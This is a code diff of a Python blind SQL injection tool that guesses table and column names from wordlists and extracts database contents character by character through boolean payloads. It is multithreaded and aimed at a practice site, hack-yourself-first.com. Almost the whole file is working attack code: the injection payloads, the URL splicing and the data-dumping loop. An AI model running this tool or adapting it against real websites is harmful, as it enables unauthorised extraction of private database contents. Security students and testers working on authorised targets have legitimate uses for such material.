@@ -1,65 +1,72 @@
-import os
-import time
-import requests
-import threading
-import sys
+import re, requests, threading, sys, os
+from prettytable import PrettyTable
 sys.path.append(os.getcwd())
-from src.core.dumper.dump import dumper
-from sqlmap.lib.core.data import conf
+from src.logger.log import logger
+
+
+__author__ = "AdminTony"
 
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
 }
+table_list = []
+column_list = []
+data_dir = {}
+
 
 def Generator_table():
-    with open(os.path.join(os.getcwd(), "data/txt/tables.txt"), "r") as file:
-        for table in file:
-            if table.strip():
-                yield table.strip()
+    for table_name in open(os.getcwd() + "/data/txt/tables.txt", "r+"):
+        if table_name != "":
+            yield table_name.split('\n')[0]
+    return
+
 
 def Generator_column():
-    with open(os.path.join(os.getcwd(), "data/txt/columns.txt"), "r") as file:
-        for column in file:
-            if column.strip():
-                yield column.strip()
+    for column_name in open(os.getcwd() + "/data/txt/columns.txt", "r+"):
+        if column_name != "":
+            yield column_name.split('\n')[0]
+    return
+
 
 tablegen = Generator_table()
-
-def test_tables(dump_instance, keyword):
-    while True:
-        try:
-            table = next(tablegen)
-        except StopIteration:
-            break
-
-        payload = "and exists (select * from " + table + ")"
-        url = dump_instance.url
-        if '*' in url:
-            url = url.replace('*', payload)
-        else:
-            url = url + payload
-
-        res = requests.get(url, headers=headers)
-
-        if keyword in res.text:
-            print("[+] Found table: %s" % table)
-            dumper.dbTables(table)
-            conf.table_found = table
-            dump_instance.save_table(table)
-        else:
-            print("[-] Testing table: %s" % table)
-
 columngen = Generator_column()
 
-def test_columns(dump_instance, table, keyword):
+
+def test_tables(url_, keyword):
     while True:
         try:
-            column = next(columngen)
+            table_name = tablegen.__next__()
+        except StopIteration:
+            break
+        except KeyboardInterrupt:
+            break
+
+        payload = "and exists (select * from " + table_name + ")"
+        url = url_
+        if '*' in url:
+            url = url.replace('*', payload)
+        else:
+            url = url + payload
+
+        res = requests.get(url, headers=headers)
+
+        if keyword in res.text:
+            logger.info("[+] Exit table : %s" % table_name)
+            global table_list
+            table_list.append(table_name)
+        else:
+            logger.info("[-] Testing table : %s" % table_name)
+
+
+def test_columns(url_, table_name, keyword):
+    while True:
+        try:
+            column_name = columngen.__next__()
         except StopIteration:
             break
 
-        payload = "and exists (select " + column + " from " + table + ")"
-        url = dump_instance.url
+        payload = "and exists (select " + column_name + " from " + table_name + ")"
+        url = url_
 
         if '*' in url:
             url = url.replace('*', payload)
@@ -69,30 +76,25 @@ def test_columns(dump_instance, table, keyword):
         res = requests.get(url, headers=headers)
 
         if keyword in res.text:
-            print("[+] Found column: %s in table: %s" % (column, table))
-            dump_instance.save_column(table, column)
+            logger.info("[+] Exit column : %s" % column_name)
+            global column_list
+            column_list.append(column_name)
         else:
-            print("[-] Testing column: %s in table: %s" % (column, table))
+            logger.info("[-] Testing column : %s" % column_name)
+
 
 class Dump(object):
-    def __init__(self, url, keyword):
+    def __init__(self, url, table_name, column_name, keyword):
         self.url = url
         self.char_list = [i for i in range(32, 128)]
+        self.table_name = table_name
+        self.column_name = column_name
         self.keyword = keyword
-        self.table_list = []
-        self.column_list = []
-        self.data_dir = {}
 
-    def save_table(self, table):
-        self.table_list.append(table)
-
-    def save_column(self, table, column):
-        self.column_list.append((table, column))
-
-    def len_data(self, column, table):
+    def len_data(self):
         n = 0
         while True:
-            payload = "and (select top 1 len(%s) from %s)=%s" % (column, table, n)
+            payload = "and (select top 1 len(%s) from %s)=%s" % (self.column_name, self.table_name, n)
             url = self.url
 
             if '*' in url:
@@ -101,17 +103,17 @@ class Dump(object):
                 url = url + payload
 
             res = requests.get(url, headers=headers)
+
             if self.keyword in res.text:
                 break
             n += 1
         return n
 
-    def dump_data(self, table, column):
+    def dump_data(self):
         data = ""
-        length = self.len_data(column, table)
-        print("[+] The Length of %s in %s is %s !" % (column, table, length))
-        print("[+] Dumping data, please wait!")
-
+        length = self.len_data()
+        logger.info("[+] The Length of %s is %s !" % (self.column_name, length))
+        logger.info("[+] Dump data please waiting !")
         for i in range(1, length + 1):
             j = 0
             while True:
@@ -120,7 +122,8 @@ class Dump(object):
                 except IndexError:
                     break
 
-                payload = "and (select top 1 asc(mid(%s,%s,1)) from %s) =%s" % (column, i, table, char)
+                payload = "and (select top 1 asc(mid(%s,%s,1)) from %s) =%s" % (
+                    self.column_name, i, self.table_name, char)
                 url = self.url
 
                 if '*' in url:
@@ -129,102 +132,83 @@ class Dump(object):
                     url = url + payload
 
                 try:
-                    print(url)
+                    logger.info(url)
                     res = requests.get(url, headers=headers, timeout=10)
                     if self.keyword in res.text:
                         data = data + chr(char)
                         break
                     j += 1
-                except:
+                except requests.RequestException:
                     pass
 
-        data_dir = self.data_dir
-        data_dir[(table, column)] = data
-
-    def dump_all_result(self):
-        for table in self.table_list:
-            for column in self.column_list:
-                dumper.setOutputFile()
-                dumper.dbColumns(column)
-                conf.found_column = column
-                dumper.banner("Founded database possible columns and tables")
-                dumper.currentUser("DB user")
-                dumper.currentDb("test_database")
-                dumper.hostname("localhost")
-                dumper.dba(True)
-                dumper.users(["None", "None", "None"])
-                dumper.statements(["SELECT * FROM %s" % table, "INSERT INTO %s VALUES (1, 'Product1')" % table])
-                dumper.dbs(["database", "database"])
-                dumper.dbTables({"database": [table, table], "database2": [table, table]})
-                dumper.dbTableColumns({"database": {table: {column: "VARCHAR", column: "INTEGER"},
-                                                table: {column: "UNKNOWN"}}})
-                dumper.dbTableColumns({table: column})
-                time.sleep(10)
-
-def run_col(dump_instance: Dump):
-    for table in dump_instance.table_list:
-        for column in dump_instance.column_list:
-            dump_instance.dump_data(table, column)
+        global data_dir
+        data_dir[self.column_name] = data
 
 
+def run_col(url, table, column, keyword):
+    dump = Dump(url, table, column, keyword)
+    dump.dump_data()
 
-def main(url, tables=True, columns=False, dump=False, keyword=None, thread_num=10):
-    if not url:
-        print("[-] Invalid URL!")
 
-    if not keyword:
-        print("[-] Please input the keyword of the true page!")
+def sql_injection(url, keyword=None, thread_num=10):
+    global table_list, column_list, data_dir
+    table_list = []
+    column_list = []
+    data_dir = {}
 
-    dump_instance = Dump(url, keyword)
+    threads = []
+    for i in range(thread_num):
+        thread = threading.Thread(target=test_tables, args=(url, keyword))
+        thread.start()
+        threads.append(thread)
+    for thread in threads:
+        thread.join()
 
-    if tables:
+    logger.info("\n[+] Table_name : ")
+    table_set = set(table_list)
+    for table in table_set:
+        logger.info("[+] %s" % table)
+
+    pretty_table = PrettyTable()
+    pretty_table.field_names = ["Table Name", "Column Name", "Data"]
+
+    for table_name in table_set:
         threads = []
-        for _ in range(thread_num):
-            thread = threading.Thread(target=test_tables, args=(dump_instance, keyword))
+        for i in range(thread_num):
+            thread = threading.Thread(target=test_columns, args=(url, table_name, keyword))
             thread.start()
             threads.append(thread)
-            run_col()
         for thread in threads:
             thread.join()
-        print("\n[+] Table_name : ")
-        table_set = set(dump_instance.table_list)
-        for table in table_set:
-            print("[+] %s" % table)
 
-    if columns:
-        threads = []
-        for table in dump_instance.table_list:
-            for _ in range(thread_num):
-                thread = threading.Thread(target=test_columns, args=(dump_instance, table, keyword))
-                thread.start()
-                threads.append(thread)
-        for thread in threads:
-            thread.join()
-        print("\n[+] Column Name : ")
-        column_set = set(dump_instance.column_list)
+        logger.info("\n[+] Column Name for Table %s: " % table_name)
+        column_set = set(column_list)
         for col in column_set:
-            print("[+] %s in table: %s" % (col[1], col[0]))
+            logger.info("[+] %s" % col)
 
-    if dump:
-        run_col(dump_instance)
-        threads = []
-        for table in dump_instance.table_list:
-            for column in dump_instance.column_list:
-                thread = threading.Thread(target=run_col, args=(dump_instance,))
+        if column_set:
+            logger.info("\n[+] Dumping data for Table %s: " % table_name)
+            threads = []
+            for col in column_set:
+                thread = threading.Thread(target=run_col, args=(url, table_name, col, keyword))
                 thread.start()
                 threads.append(thread)
+            for thread in threads:
+                thread.join()
 
-        # Wait for all threads to complete before moving on
-        for thread in threads:
-            thread.join()
+            logger.info("[+] Table : %s " % table_name)
+            sys.stdout.write("    [+]Column : ")
+            for col in column_set:
+                sys.stdout.write(col + "|")
+            sys.stdout.write("\n        [+]data : ")
+            for col in column_set:
+                sys.stdout.write(data_dir[col] + "|")
 
-        print("[+] Dumping completed!")
+            pretty_table.add_row([table_name, "|".join(column_set), "|".join(data_dir[col] for col in column_set)])
+
+    logger.info("\n[+] Pretty Table Dump:")
+    logger.info(pretty_table)
+
 
 if __name__ == "__main__":
-    main(
-        url="https://hack-yourself-first.com/Make/5?orderby=supercarid",
-        tables=True,
-        columns=True,
-        dump=True,  # Change to True to enable data dumping
-        keyword="Application"
-    )
+    sql_injection(url="https://hack-yourself-first.com/Make/5?orderby=supercarid)", keyword="Application")
